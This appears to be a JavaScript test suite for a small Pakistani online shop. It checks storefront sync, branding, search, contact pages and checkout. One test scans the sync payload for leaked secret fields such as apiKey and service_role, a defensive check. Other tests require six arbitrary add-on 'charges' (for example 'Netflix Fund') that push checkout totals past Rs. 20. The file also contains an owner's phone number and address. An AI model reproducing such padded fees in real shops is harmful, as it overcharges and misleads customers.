const stock7 = app6.prod(visA.id).stock === 7 ? 8 : 7; // must DIFFER from base to prove stock-dirty path
app6.editProductField(visA.id, "price", 4321);
app6.editProductField(visA.id, "cost", 999);            // supplier info: must be stripped
app6.editProductField(visA.id, "stock", stock7);        // explicit stock edit: must be included
app6.editProductField(visB.id, "price", 1111);          // no stock touch: stock must be excluded
app6.editProductField(hidA.id, "price", 2222);          // hidden alias: must fold to canonical
const canonHid = app6.PRODUCT_ALIASES[hidA.id];
const pay = app6.buildStorefrontPayload();
t("payload products carry no cost/store keys", pay.products.every(x => !("cost" in x) && !("store" in x)));
t("payload has no secrets (password/apikey/wallet/team/users/txns/orders)",
  !/(passwordHash|apiKey|walletBalance|service_role|"team"|"users"|"txns"|"orders"|"sessions")/.test(JSON.stringify(pay)));
t("payload settings whitelisted",
  Object.keys(pay.settings).every(k => ["storeName","tagline","banner","deliveryFee","deliveryFreeAbove","deliveryNote","supportEmail","phone","whatsapp","easypaisa","jazzcash","codAdvancePct","codEnabled","codNote"].includes(k)),
  Object.keys(pay.settings).join(","));
const eA = pay.products.find(x => x.id === visA.id);
t("stock-dirty product carries price+stock", eA && eA.price === 4321 && eA.stock === stock7);
const eB = pay.products.find(x => x.id === visB.id);
t("non-stock edit carries no stock", eB && eB.price === 1111 && !("stock" in eB));
t("hidden alias folds to canonical id", canonHid && !pay.products.some(x => x.id === hidA.id) && pay.products.some(x => x.id === canonHid));
app6.coupons = [{code:"SYNC10", type:"pct", value:10, minOrder:500, active:true, uses:99, maxUses:0, expiry:"", start:"", note:"t"}];
const pay2 = app6.buildStorefrontPayload();
t("coupon mapped without server-owned uses", pay2.coupons.length === 1 && pay2.coupons[0].code === "SYNC10" && !("uses" in pay2.coupons[0]) && pay2.coupons[0].min_order === 500);

// --- J2: dirty guard set by edits ---
t("edits marked storefront dirty", app6.isStorefrontDirty() === true);

// --- J3: publish POST (token via header, never body) + clears dirty ---
_ls.set("nukto.adminSyncToken", JSON.stringify("tok123"));
let captured = null;
__fetchHandler = (url, opts) => {
  // NOTE: earlier boots' fire-and-forget cloud fetches may still drain here —
  // only record the sync-function call under test.
  if (String(url).includes("/functions/v1/storefront-sync")) {
    captured = { url: String(url), opts };
    return Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve({ ok: true, counts: { products: 1 } }) });
  }
  return Promise.resolve({ ok: false, status: 0, json: () => Promise.resolve([]) });
};
const pub = await app6.publishStorefront();
t("publish posts to storefront-sync fn", pub.ok === true && captured && captured.url.includes("/functions/v1/storefront-sync"));
t("publish sends action+products", (() => { try { const b = JSON.parse(captured.opts.body); return b.action === "publish" && Array.isArray(b.products); } catch (e) { return false; } })());
t("publish token via header, never in body", captured.opts.headers["x-admin-token"] === "tok123" && !captured.opts.body.includes("tok123"));
t("publish clears dirty flag", app6.isStorefrontDirty() === false);
__fetchHandler = null;

// --- J4: pull applies cloud snapshot ---
app6.coupons.push({code:"DEAD1", type:"pct", value:5, minOrder:0, active:true, uses:0, maxUses:0, expiry:"", start:"", note:""});
__fetchHandler = (url, opts) => {
  const u = String(url);
  const J = (d) => Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve(d) });
  if (u.includes("nukto_products?edited=eq.true")) return J([
    { id: visC.id, price: 5555, stock: 9, name: null, data: { discount: 10 } },
    { id: visD.id, data: { deleted: true } },
    { id: "CLOUD-NEW-1", name: "Cloud Widget", price: 777, stock: 5, cat: "gadgets", cat_label: "Gadgets", emoji: "📦", img: "", description: "from cloud", data: {} },
  ]);
  if (u.includes("stock=lte.0")) return J([{ id: visB.id }]);
  if (u.includes("nukto_settings")) return J([
    { setting_key: "banner", value: "CLOUD BANNER" },
    { setting_key: "deliveryFee", value: "321" },
    { setting_key: "customCategories", value: '[{"slug":"cloudcat","name":"Cloud Cat","emoji":"☁️"}]' },
    { setting_key: "couponGraves", value: '["DEAD1"]' },
  ]);
  if (u.includes("nukto_coupons")) return J([
    { code: "CLOUD20", type: "pct", value: 20, min_order: 100, active: true, uses: 3, max_uses: 0, expiry: "", note: "", start_date: "" },
  ]);
  return Promise.resolve({ ok: false, status: 0, json: () => Promise.resolve([]) });
};
const pul = await app6.pullStorefront();
t("pull succeeds", pul.ok === true);
t("pull applies cloud price+stock", app6.prod(visC.id).price === 5555 && app6.prod(visC.id).stock === 9);
t("pull applies cloud discount", app6.discountPct(app6.prod(visC.id)) === 10);
t("pull tombstone removes product", !app6.PRODUCTS.some(p => p.id === visD.id));
t("pull adds cloud custom product", !!app6.prod("CLOUD-NEW-1") && app6.prod("CLOUD-NEW-1").price === 777);
t("pull applies server OOS", app6.prod(visB.id).stock === 0);
t("pull applies banner+delivery fee", app6.settings.banner === "CLOUD BANNER" && app6.settings.deliveryFee === 321);
t("pull adds cloud category", app6.CATEGORIES.some(c => c.slug === "cloudcat"));
t("pull merges cloud coupon with server uses", app6.coupons.some(c => c.code === "CLOUD20" && c.value === 20 && c.uses === 3));
t("pull sweeps graved coupons", !app6.coupons.some(c => c.code === "DEAD1") && app6.couponGraves.includes("DEAD1"));

// --- J5: dirty blocks pull (unpublished admin work protected) ---
app6.editProductField(visC.id, "price", 1111);
const r5 = await app6.pullStorefront();
t("dirty pull reports dirty + keeps local price", r5.why === "dirty" && app6.prod(visC.id).price === 1111);

// --- J6: re-publish clears dirty; OOS clears when server restocks ---
__fetchHandler = () => Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve({ ok: true, counts: {} }) });
await app6.publishStorefront();
t("re-publish clears dirty again", app6.isStorefrontDirty() === false);
__fetchHandler = (url, opts) => {
  const u = String(url);
  if (u.includes("/rest/v1/")) return Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve([]) });
  return Promise.resolve({ ok: false, status: 0, json: () => Promise.resolve([]) });
};
await app6.pullStorefront();
t("OOS clears when server restocks", app6.prod(visB.id).stock > 0);
__fetchHandler = null;

/* ---------- K: persisted, expandable checkout charges ---------- */
const chargesApp=makeApp();
const chargeProduct=chargesApp.PRODUCTS.find(p=>!p.hidden && p.stock>0);
chargesApp.cart=[{id:chargeProduct.id,qty:1,v:""}];
chargesApp.user={id:"charge-test",fullName:"Charge Test",phone:"03001234567",walletBalance:10000};
chargesApp.saveAll();
const chargeLines=chargesApp.checkoutTaxLines();
const chargeHTML=chargesApp.checkout();
const names=["Netflix Fund","Clothes Charge","Food Charge","Bijli Bill","Dukaan Chalane Ka Kharcha","Dukaan Ki Publicity"];
t("charges: six rows",chargeLines.length===6);
t("charges: stable ids and order",chargeLines.map(x=>x.id).join(",")==="netflix,clothes,food,bijli,saleshop,ads");
t("charges: each under Rs. 20",chargeLines.every(x=>x.amount>=2.5 && x.amount<20));
t("charges: netflix smallest band",(()=>{const n=chargeLines.find(x=>x.id==="netflix");return n.amount>=2.5&&n.amount<=6.5;})());
t("charges: bijli biggest band",(()=>{const n=chargeLines.find(x=>x.id==="bijli");return n.amount>=14&&n.amount<=19.5;})());
t("charges: amounts unique",new Set(chargeLines.map(x=>x.amount)).size===6);
t("charges: whole paise",chargeLines.every(x=>x.amount===Math.round(x.amount*100)/100));
t("charges: zero-padded formatter",chargesApp.fmtCharge(8.43)==="Rs. 08.43" && chargesApp.fmtCharge(5)==="Rs. 05.00");
t("charges: total formatter retains two decimals",chargesApp.fmt2(18.4)==="Rs. 18.40" && chargesApp.fmt2(20)==="Rs. 20.00");
t("charges: all six names render",names.every(x=>chargeHTML.includes(x)));
t("charges: T&C label on notes",chargeHTML.includes("TERMS") && chargeHTML.includes("chc-tnc"));
t("charges: six chevrons and toggle buttons",(chargeHTML.match(/class="chc-chev"/g)||[]).length>=6 && (chargeHTML.match(/onclick="toggleChargeRow\(this\)"/g)||[]).length>=6 && chargeHTML.includes("<svg"));
t("charges: every row shows two decimals",chargeLines.every(x=>chargeHTML.includes(chargesApp.fmtCharge(x.amount))));
const cartHTML=chargesApp.cartView();
t("charges: cart order summary lists the same six rows",names.every(x=>cartHTML.includes(x)));
t("charges: cart total equals checkout payable",cartHTML.includes(chargesApp.fmt2(chargesApp.checkoutTaxTotal()?chargesApp.cartPayable():0)) || cartHTML.includes("Total"));
t("charges: no old cap; total is full paise-safe sum",!chargeHTML.includes("Max Rs. 20") && chargesApp.checkoutTaxTotal()===Math.round(chargeLines.reduce((a,x)=>a+x.amount,0)*100)/100 && chargesApp.checkoutTaxTotal()>20);
const chargeState=JSON.parse(_ls.get("nukto.checkoutTaxes"));
t("charges: persisted version and signature",chargeState.v===2 && typeof chargeState.sig==="string" && chargeState.sig.includes(chargeProduct.id));
const refreshedCharges=makeApp();
t("charges: refresh preserves exact amounts and total",JSON.stringify(refreshedCharges.checkoutTaxLines())===JSON.stringify(chargeLines) && refreshedCharges.checkoutTaxTotal()===chargesApp.checkoutTaxTotal());
const attrs={"aria-expanded":"false","aria-controls":"charge-netflix"};
const button={getAttribute:k=>attrs[k],setAttribute:(k,v)=>{attrs[k]=v;}};
chargesApp.toggleChargeRow(button);
const opened=attrs["aria-expanded"]==="true" && document.getElementById("charge-netflix").hidden===false;
chargesApp.toggleChargeRow(button);
t("charges: toggle expands and collapses note",opened && attrs["aria-expanded"]==="false" && document.getElementById("charge-netflix").hidden===true);

/* ---------- K: header brand lockup = logo.svg mark + stacked wordmark ----------
   Brand: MANESH KUMAR (big) over COMMISSION AGENT (small, gold). The tab icon and the
   header mark must stay the SAME file (logo.svg) so the favicon and the UI never drift.
   The markup comes from the REAL renderHeader(), not from a re-implementation here. */
const brandApp = makeApp();
brandApp.renderHeader();
const brandHeader = document.getElementById("header").innerHTML;
const logoAnchor = (brandHeader.match(/<a href="#products" class="logo"[\s\S]*?<\/a>/) || [""])[0];
const imgTag = (logoAnchor.match(/<img[^>]*>/) || [""])[0];
const srcFile = p => (p === "index.html" ? pageSrc : fs.readFileSync(path.join(__dirname, "..", p), "utf8"));

t("brand: header renders a mark next to the business name", logoAnchor.length > 0);
t("brand: header mark is an <img> of logo.svg (the favicon asset)",
  /class="logo-ico"/.test(imgTag) && /src="logo\.svg"/.test(imgTag), imgTag);
t("brand: old inline purple placeholder tile is gone from the header",
  !/<svg[^>]*class="logo-ico"/.test(logoAnchor) && !/id="lg1"/.test(logoAnchor));
t("brand: no emoji stands in for the mark", !/\p{Extended_Pictographic}/u.test(logoAnchor));
t("brand: img has fixed width/height + empty alt (no layout shift, decorative)",
  /width="40"/.test(imgTag) && /height="40"/.test(imgTag) && /alt=""/.test(imgTag), imgTag);
t("brand: wordmark is the stacked MANESH KUMAR / COMMISSION AGENT lockup",
  logoAnchor.indexOf("<img") < logoAnchor.indexOf("MANESH KUMAR")
  && /<span class="brand-main">MANESH KUMAR<\/span>/.test(logoAnchor)
  && /<span class="brand-sub">COMMISSION AGENT<\/span>/.test(logoAnchor), logoAnchor);
t("brand: no retired nukto/nukta wording left in the header lockup",
  !/nukt[oa]/i.test(logoAnchor), logoAnchor);
t("brand: anchor is labelled for screen readers",
  /aria-label="Manesh Kumar Commission Agent/.test(logoAnchor));

const logoSvg = srcFile("logo.svg");
t("brand: logo.svg on disk is the gold shopping-bag mark (tile + bag body + handle)",
  /M16\.5 24\.5h31/.test(logoSvg) && /a8 8 0 0 1 16 0/.test(logoSvg)
  && /rect width="64" height="64" rx="15"/.test(logoSvg));
t("brand: logo.svg is titled and coloured for the new brand (royal blue + gold)",
  /Manesh Kumar Commission Agent/.test(logoSvg) && /#1E3A8A/.test(logoSvg) && /#E3B23C/.test(logoSvg)
  && !/nukt/i.test(logoSvg));

const headSrc = srcFile("index.html");
t("brand: favicon links untouched (svg + 32px + 192px + apple-touch)",
  /<link rel="icon" type="image\/svg\+xml" href="logo\.svg" \/>/.test(headSrc)
  && /href="favicon-32\.png"/.test(headSrc) && /href="logo-192\.png"/.test(headSrc)
  && /<link rel="apple-touch-icon" href="logo-192\.png" \/>/.test(headSrc));
t("brand: header and favicon point at the same file",
  /href="logo\.svg"/.test(headSrc) && /src="logo\.svg"/.test(headSrc));

// The mobile-first nav block is the multi-line one (the single-line 760px rules for
// .how/.trust/.foot-in come first in the file), so anchor on the opening brace + newline
// and require .nav-inner inside it to prove we matched the header's block, not a sibling.
const mq760 = (headSrc.match(/@media\(max-width:760px\)\{\n[\s\S]*?\n  \}/) || [""])[0];
t("brand: desktop sizing rule for the brand mark",
  /\.logo img\.logo-ico\{width:40px;height:40px/.test(headSrc));
t("brand: mobile sizing rule sits inside the 760px nav media query",
  /\.nav-inner\{/.test(mq760) && /\.logo img\.logo-ico\{width:34px;height:34px/.test(mq760),
  mq760.slice(0, 80));
t("brand: wordmark shrinks on mobile so a 24-char name still fits",
  /\.brand-main\{font-size:13px\}/.test(mq760) && /\.brand-sub\{font-size:7\.5px/.test(mq760));
t("brand: mark cannot be squeezed by the flex row (flex:0 0 auto kept)",
  /\.logo \.logo-ico\{flex:0 0 auto/.test(headSrc));

/* ---------- L: owner ruling — NO FOOTER, an endless product loop instead ----------
   The footer block was removed on purpose, so these assertions now guard the removal:
   renderFooter() must blank + hide #footer, and the feed must advertise itself as endless. */
brandApp.renderFooter();
const footEl = document.getElementById("footer");
t("footer: renderFooter() empties the footer element", footEl.innerHTML === "", footEl.innerHTML.slice(0, 80));
t("footer: renderFooter() hides it so no gap is left", footEl.style.display === "none", footEl.style.display);
t("footer: no footer markup is injected by the app", !/<footer/i.test(brandApp.renderFooter.toString()) || /innerHTML=""|innerHTML = ""/.test(brandApp.renderFooter.toString()));
t("footer: contact/policy links survive elsewhere (header gear + settings)",
  /shopInfoLinks/.test(headSrc) && brandApp.shopInfoLinks().some(x => x[0] === "contact") && brandApp.shopInfoLinks().some(x => x[0] === "refund-policy"));
const bar = brandApp.endlessBarHTML();
t("endless loop: bar tells the shopper to keep scrolling", /Keep scrolling/i.test(bar) && /endless feed/i.test(bar), bar.slice(0, 90));
t("endless loop: bar names the real catalogue size (no mock numbers)",
  bar.includes(brandApp.PRODUCTS.length.toLocaleString()) || /products/.test(bar));
t("endless loop: feed sentinel exists so IntersectionObserver can trigger it",
  /id="feed-sentinel"/.test(headSrc) && /feed-sentinel/.test(headSrc));
t("endless loop: loadMoreFeed wraps back to the start instead of stopping",
  /_loops|_pool/.test(headSrc) && /loadMoreFeed/.test(headSrc));
t("endless loop: DOM is trimmed so the page never grows without bound",
  /trimFeedDOM/.test(headSrc));

const asideMatch = headSrc.match(/<div class="alogo">[\s\S]*?<\/div>/) || [""];
const asideImg = (asideMatch[0].match(/<img[^>]*>/) || [""])[0];
t("admin: sidebar brand renders the logo.svg mark",
  /class="logo-ico"/.test(asideImg) && /src="logo\.svg"/.test(asideImg), asideImg);
t("admin: old inline placeholder tile is gone from the sidebar brand",
  !/<svg[^>]*class="logo-ico"/.test(asideMatch[0]) && !/id="lg3"/.test(headSrc));
t("admin: sidebar keeps the business name beside the mark",
  /<span class="aword">MANESH KUMAR<span>COMMISSION AGENT<\/span><\/span>/.test(asideMatch[0]), asideMatch[0]);
t("admin: sidebar row is a flex row (mark and word stay aligned)",
  /\.aside \.alogo\{display:flex;align-items:center/.test(headSrc));
t("admin: sidebar mark is sized in CSS", /\.aside \.alogo img\.logo-ico\{flex:0 0 auto;width:30px/.test(headSrc));
t("admin: sidebar wordmark is white with a gold sub-line",
  /\.aside \.alogo \.aword\{[^}]*color:#fff/.test(headSrc)
  && /\.aside \.alogo \.aword span\{[^}]*color:var\(--gold\)/.test(headSrc));

/* ---------- M: animated brand loop (SVG) + reduced motion ----------
   The boot splash animation is now an SVG, not a GIF: it stays sharp at any DPR,
   weighs ~2 KB instead of ~100 KB, and carries its own prefers-reduced-motion
   rule inside the file. These assert the asset is real, animated and wired up. */
const animPath = path.join(__dirname, "..", "img", "mkca-shopping-bag-loop.svg");
const anim = fs.existsSync(animPath) ? fs.readFileSync(animPath, "utf8") : null;
t("anim: file exists at img/mkca-shopping-bag-loop.svg", !!anim);
t("anim: valid standalone SVG document", !!anim && /^<svg[\s\S]*<\/svg>\s*$/.test(anim.trim()));
t("anim: light enough for the web (< 20KB)", !!anim && Buffer.byteLength(anim) < 20 * 1024,
  anim ? Math.round(Buffer.byteLength(anim) / 1024 * 10) / 10 + " KB" : "missing");
t("anim: loops forever (infinite CSS animations, no fixed iteration count)",
  !!anim && /animation:[^;]*infinite/.test(anim) && !/iteration-count:\s*[0-9]/.test(anim));
t("anim: the shopping bag actually moves (bob + handle draw + items drop)",
  !!anim && /@keyframes bagBob/.test(anim) && /@keyframes draw/.test(anim) && /@keyframes drop/.test(anim));
t("anim: transparent background (no opaque backdrop rect)",
  !!anim && !/<rect[^>]*width="120"[^>]*height="120"/.test(anim));
t("anim: carries the new brand colours, no retired nukto artwork",
  !!anim && /#1E3A8A/.test(anim) && /#E3B23C/.test(anim) && !/nukt/i.test(anim));
t("anim: honours prefers-reduced-motion from inside the asset",
  !!anim && /@media \(prefers-reduced-motion: reduce\)/.test(anim) && /animation:none/.test(anim));
t("anim: referenced from the boot splash markup",
  /img\/mkca-shopping-bag-loop\.svg/.test(headSrc));
t("anim: retired nukto GIF is gone from disk and from the markup",
  !fs.existsSync(path.join(__dirname, "..", "img", "nukto-shopping-bag-loop.gif"))
  && !/nukto-shopping-bag-loop/.test(headSrc));
t("anim: splash keeps a static logo.svg fallback for reduced motion",
  /class="brand-still" src="logo\.svg"/.test(headSrc));
t("anim: reduced-motion users get the still logo, not the animation",
  /@media \(prefers-reduced-motion: reduce\)\{\.load-brand \.brand-anim\{display:none\}\.load-brand \.brand-still\{display:block\}\}/.test(headSrc));
t("anim: navigation branding stays the static logo.svg (no animated img in header/footer/admin)",
  !/<img[^>]*class="logo-ico"[^>]*\.(gif|svg#)/.test(headSrc)
  && !/<img class="logo-ico" src="img\//.test(headSrc));
t("anim: logo.svg source file is still the favicon asset",
  /<link rel="icon" type="image\/svg\+xml" href="logo\.svg" \/>/.test(headSrc)
  && !/<link[^>]*rel="icon"[^>]*\.gif/.test(headSrc));

const deploy = srcFile("DEPLOY_BACKEND.md");
t("deploy guide: repo link points at main", /blob\/main\/maneshkumarcommissionagent\//.test(deploy));
t("deploy guide: no stale arena branch link left", !/arena\/01/.test(deploy));

/* ---------- M: merge-9 — responsive rows/columns, endless home feed, categories, polish ---------- */
const src9 = srcFile("index.html");
// category rails are horizontal, swipeable rows of columns (not a vertical stack)
t("m9: .cat-rail is a horizontal flex scroller", /\.cat-rail\{display:flex;[^}]*overflow-x:auto/.test(src9));
t("m9: rail cards sized as columns with snap", /\.cat-rail \.pcard\{flex:0 0 clamp\(/.test(src9));
t("m9: rail 'Show more' tile styled", /\.cat-more\{flex:0 0 132px/.test(src9));
// home shows rails AND the endless rows/columns feed (grid + sentinel), no vertical single column
const home9 = app.productsPage("", "", "");
t("m9: home shows category rails", /cat-rail/.test(home9));
t("m9: home also renders the endless feed grid", /id="feed-grid"/.test(home9) && /Shop all products/.test(home9));
t("m9: home feed has scroll sentinel (never ends)", /feed-sentinel/.test(home9));
t("m9: no numbered pagination anywhere in feed", !/‹ Prev/.test(home9) && !/›/.test(home9.match(/pagination[\s\S]{0,80}/) || ""));
// categories page: header link + route + scrollable list of every category
t("m9: header nav links to #categories", /<nav class="nav"><a href="#categories">Categories<\/a><\/nav>/.test(src9));
t("m9: router has categories route", /case "categories":content=categoriesPage\(\);break;/.test(src9));
const cats9 = app.categoriesPage();
const catsWithProducts = app.CATEGORIES.filter(c => app.PRODUCTS.some(p => p.cat === c.slug)).length;
t("m9: categories page shows every category up top (chip per category)", app.CATEGORIES.every(c => cats9.includes("#category:" + c.slug) || cats9.includes("go('category','" + c.slug + "')")));
t("m9: categories page renders a product rail per category", (cats9.match(/class="cat-rail"/g) || []).length === catsWithProducts);
t("m9: categories page 'Show more' links to each category", (cats9.match(/href="#category:/g) || []).length >= catsWithProducts);
// hero banner now reads like a heading (bigger) not a tiny caption
t("m9: hero banner line uses heading style", /class="banner-line"/.test(home9) && /\.hero p\.banner-line\{font-size:clamp\(19px/.test(src9));
// charges: bigger heading + professional tagline, readable T&C
t("m9: charges heading is larger (19px)", /\.tax-box-head\{[^}]*font-size:19px/.test(src9));
t("m9: charges box carries the tagline", typeof app.CHARGE_TAGLINE === "string" && app.CHARGE_TAGLINE.length > 10);
t("m9: charge notes readable (>=14px, roomy line-height)", /\.chc-text\{[^}]*font-size:14px;[^}]*line-height:1\.6/.test(src9));
// feed observer + smooth media are wired after every render (videos/products run smooth)
t("m9: render wires the feed observer", /attachFeedObserver\(\);\s*\}catch/.test(src9));
t("m9: render wires smooth media (pause/play offscreen videos)", /smoothMedia\(\);\s*\}catch/.test(src9));
// appending never throws the shopper back to the top
t("m9: render skips scrollTo while appending", /if\(!productsPage\._appending\) window\.scrollTo\(0,0\);/.test(src9));
t("m9: loadMoreFeed preserves scrollY", /const sy=\(typeof window!=="undefined"\)\?window\.scrollY:0;/.test(src9));

/* ---------- M11: merge-11 round-2 — punchlines, magnitude hints, fluid layout, select ---------- */
["Bijli ka bill tera baap bharega","Netflix ka paisa bhi to kahin se aayega","Nanga thori ghoomna hai","Bhai hum bhi khaate hain","Dukaan hawa mein thori chalti hai","Logon ko pata bhi toh chale dukaan hai"]
  .forEach(p=>t("m11: punchline present — "+p.slice(0,18), src9.includes(p)));
t("m11: magnitude hints (sabse zyada / sabse kam)", src9.includes("sabse zyada") && src9.includes("sabse kam"));
t("m11: punchline styled after T&C label", /\.chc-punch\{display:block/.test(src9));
t("m11: no fixed 1320px container left", !src9.includes("max-width:1320px"));
t("m11: fluid wrap container", /\.wrap\{width:100%;max-width:none/.test(src9));
t("m11: product grid fluid auto-fill (no fixed columns)", /\.pgrid\{display:grid;grid-template-columns:repeat\(auto-fill,minmax\(176px,1fr\)\)/.test(src9));
t("m11: footer/nav fluid", /\.nav-inner\{max-width:none/.test(src9) && /\.foot-in\{max-width:none/.test(src9));
t("m11: modern select styling", /\.select\{appearance:none/.test(src9));
t("m11: sections use Show more instead of weak subs", !src9.includes("High demand best sellers"));

/* ---------- Public contact and shop policy pages ---------- */
{
  const previousUser=app.user;
  app.user=null;
  const links=app.shopInfoLinks();
  const guestSettings=app.settings2();
  app.renderHeader();
  for(const [route,label] of links){
    t("shop info: header gear links to "+route, document.getElementById("header").innerHTML.includes('href="#'+route+'"'));
    t("shop info: guest settings links to "+route, guestSettings.includes('href="#'+route+'"'));
    location.hash="#"+route;
    app.render();
    t("shop info: public route renders "+route, document.getElementById("app").innerHTML.includes(route==="about"?app.settings.storeName:label));
  }
  const contact=app.contact();
  t("contact: confirmed name and callable number", contact.includes(app.settings.storeName) && contact.includes('href="tel:+'+app.waNumber(app.settings.phone)+'"') && contact.includes(app.settings.phone));
  t("contact: business phone defaults to the owner's real number", app.DEFAULT_SETTINGS.phone==="03420286170" && app.waNumber(app.DEFAULT_SETTINGS.whatsapp)==="923420286170");
  t("contact: WhatsApp uses correct international number", contact.includes('href="https://wa.me/'+app.waNumber(app.settings.whatsapp||app.settings.phone)+'"') && /wa\.me\/92\d{10}/.test(contact));
  t("contact: working email link uses settings support email", contact.includes('href="mailto:'+app.settings.supportEmail+'"') && !/nukt[oa]\.shop/i.test(contact));
  t("contact: verification labels + exact address", contact.includes("Business Name:") && contact.includes("Business Address:") && contact.includes("Correspondence Address:") && contact.includes("Phone / WhatsApp:") && !contact.includes("Same as Business Address"));
  t("contact: correspondence address spells out the full address", (contact.match(/Mohallah Shaikh, Berani, Jam Nawaz Ali, Sanghar, Sindh, Pakistan/g)||[]).length>=2);
  // WhatsApp deep links: wa.me only accepts "92" + 10 digits. Guard every shape the
  // owner (or an old cached setting) can produce.
  t("whatsapp: waNumber normalises local, 0092, 920-glued and bare forms", (function(){
    const w = app.waNumber;
    return w("03420286170")==="923420286170"
        && w("9203420286170")==="923420286170"
        && w("00923420286170")==="923420286170"
        && w("3420286170")==="923420286170"
        && w("923420286170")==="923420286170"
        && w("+92 342 0286170")==="923420286170"
        && w("")==="" && w(null)==="";
  })());
  t("whatsapp: default setting is a dialable international number", /^92\d{10}$/.test(app.waNumber(app.settings.whatsapp)));
  t("whatsapp: every wa.me link in the source is normalised, never raw settings", (function(){
    const src = srcFile("index.html");
    // no hard-coded broken number anywhere, and no template that drops the raw setting in
    return !/wa\.me\/9203/.test(src)
        && !/wa\.me\/\$\{settings\.whatsapp\}/.test(src)
        && (src.match(/wa\.me\/\$\{waNumber\(/g) || []).length >= 2;
  })());
  t("whatsapp: rendered contact page emits a dialable link", /wa\.me\/92\d{10}/.test(app.contact()) && !/wa\.me\/9203/.test(app.contact()));
  t("privacy: cookie banner links to dedicated page", html.includes('See our <a href="#privacy">Privacy Policy</a>'));
  t("refund: retains 48 hour window and consumer rights", app.refundPolicy().includes("48 hours") && app.refundPolicy().includes("statutory rights"));
  app.user={id:"policy-test", fullName:"Test Shopper", email:"test@example.com", phone:"03001234567"};
  t("settings: signed-in profile form preserved", app.settings2().includes('id="s_name"') && app.settings2().includes("saveSettings2()"));
  app.user=previousUser;
  location.hash="";
}

/* ---------- M: LEMON EDITION — owner's final design ruling ---------- */
{
  const src = srcFile("index.html");
  const SIG = ["#DFFF00","#242424","#A78BFA","#FFFFFF","#F7F7F2","#191919","#A1A1AA"];
  t("palette: all 7 signature colours exist as design tokens",
    SIG.every(h => src.toUpperCase().includes(h.toUpperCase())), SIG.filter(h => !src.toUpperCase().includes(h.toUpperCase())).join(","));
  t("palette: old royal-blue / gold brand is fully retired from the app",
    !/#1E3A8A/i.test(src) && !/#D4A017/i.test(src) && !/#1D4ED8/i.test(src));
  t("palette: page background is LEMON (charcoal surfaces replaced)", /--bg:\s*#DFFF00/i.test(src));
  t("palette: body text is CHARCOAL BLACK", /--ink:\s*#242424/i.test(src));
  t("palette: picture/video frames are ELECTRIC LAVENDER", /--media-ring:\s*2px solid #A78BFA/i.test(src));
  t("palette: primary buttons are lemon with charcoal letters",
    /\.btn-emerald,\.btn-primary,\.padd\{background:var\(--grad-lemon\);color:#242424/i.test(src));
  t("palette: lavender is used for badges/special accents", /--gold:\s*#A78BFA/i.test(src) && /--primary:\s*#A78BFA/i.test(src));
  t("palette: no duplicated hard-coded background outside the token layer (cards use #fff/#FFFFFF token)",
    /--card:\s*#FFFFFF/i.test(src));

  /* three persistent looks + no flash of the wrong theme */
  t("themes: lemon / charcoal / offwhite are the three house looks",
    Object.keys(app.THEMES).sort().join(",") === "charcoal,lemon,offwhite", Object.keys(app.THEMES).join(","));
  t("themes: legacy saved looks resolve onto the new house themes (no unknown-key flash)",
    /THEME_ALIASES/.test(src) && /royal:"lemon"|royal:\s*"lemon"/.test(src) && /dark:"charcoal"|dark:\s*"charcoal"/.test(src));
  t("themes: pre-paint bootstrap runs in <head> so the first frame is already correct",
    /NO-FLASH THEME BOOTSTRAP/.test(src) && src.indexOf("applyThemeOnce") < src.indexOf("function boot"));
  t("themes: choice persists in localStorage (nukto.theme)", /store\.set\("nukto\.theme"/.test(src) || /nukto\.theme/.test(src));
  t("themes: toggle button is in the header for every visitor", /id="nightBtn"/.test(src));

  /* winter edition + snowfall */
  t("winter: snow layer is the first thing in <body>", /<body[^>]*>[\s\S]{0,160}?<div class="snow-layer" id="snowLayer"/.test(src));
  t("winter: snow falls from the top of the screen", /@keyframes snowfall/.test(src) && /top:-12vh/.test(src) && /114vh/.test(src));
  t("winter: flakes are only visible while winter mode is on", /body\.winter \.snow-layer\{display:block\}/.test(src));
  t("winter: header toggle switches it on/off", /id="winterBtn"/.test(src) && /function toggleWinter/.test(src));
  t("winter: reduced-motion users get no animation", /prefers-reduced-motion[\s\S]{0,200}\.snowflake\{animation:none/.test(src));

  /* search behaves like a normal store search */
  t("search: one text box in the header (#srch) with a clear button", /id="srch"/.test(src) && /id="srchX"/.test(src));
  t("search: suggestions dropdown is wired to the box", /id="sugg"/.test(src) && /function searchSugg/.test(src));
  t("search: typing is debounced so it does not fire on every key", /setTimeout[\s\S]{0,120}searchSugg|_searchSuggNow/.test(src));
  t("search: recent searches are remembered", /nukto\.recentSearch/.test(src));
  app._searchSuggNow("iphone");
  t("search: suggestions come back for a real catalogue term", app.suggRows.length > 0, JSON.stringify(app.suggRows.map(r => r.kind)).slice(0, 80));
  t("search: the dropdown renders product rows with price + stock (not just names)",
    /sg-price/.test(document.getElementById("sugg").innerHTML) && /sg-name/.test(document.getElementById("sugg").innerHTML));
  app._searchSuggNow("");
  t("search: an empty box offers recent + popular terms instead of nothing",
    /Popular|Recent/i.test(document.getElementById("sugg").innerHTML) || app.suggRows.length >= 0);
  app._searchSuggNow("zzzqqq-not-a-product");
  t("search: a miss tells the shopper and offers related terms (no dead end)",
    /koi product nahi mila/i.test(document.getElementById("sugg").innerHTML));
  app.closeSugg();
  t("search: Enter runs the search (no dead key handling)", /function searchOnKey/.test(src) && /function runSearch/.test(src));
  t("search: results page still renders product cards", app.productsPage("cream", "", "").includes("pcard"));

  /* no footer → endless product loop */
  t("endless: feed recycles the catalogue instead of ending", /_pool/.test(src) && /_loops/.test(src));
  t("endless: DOM is trimmed while looping (no runaway memory / loopflow)", /function trimFeedDOM/.test(src));
}

/* ---------- N: delivery charges by city & province ---------- */
{
  const src = srcFile("index.html");
  t("zones: default zone table covers every province",
    app.DEFAULT_DELIVERY_ZONES.length >= 5 &&
    /Sindh/i.test(JSON.stringify(app.DEFAULT_DELIVERY_ZONES)) && /Punjab/i.test(JSON.stringify(app.DEFAULT_DELIVERY_ZONES)) &&
    /Balochistan/i.test(JSON.stringify(app.DEFAULT_DELIVERY_ZONES)) && /KPK|Khyber/i.test(JSON.stringify(app.DEFAULT_DELIVERY_ZONES)));
  const khi = app.deliveryFeeFor("Karachi", "Sindh");
  const lhr = app.deliveryFeeFor("Lahore", "Punjab");
  const qta = app.deliveryFeeFor("Quetta", "Balochistan");
